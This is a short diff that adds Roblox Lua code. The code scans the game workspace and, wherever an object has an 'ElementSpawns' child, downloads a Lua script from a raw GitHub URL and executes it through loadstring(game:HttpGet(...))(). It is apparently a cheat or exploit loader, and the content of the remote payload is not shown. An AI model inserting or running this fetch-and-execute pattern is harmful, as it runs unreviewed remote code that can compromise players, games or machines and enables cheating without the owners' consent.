@@ -1,0 +1,5 @@
+for i, childrik in ipairs(workspace:GetDescendants()) do
+    if childrik:FindFirstChild("ElementSpawns") then
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/rriihhttgg/RriihhttggScript/refs/heads/main/TestED.lua"))()
+    end
+end
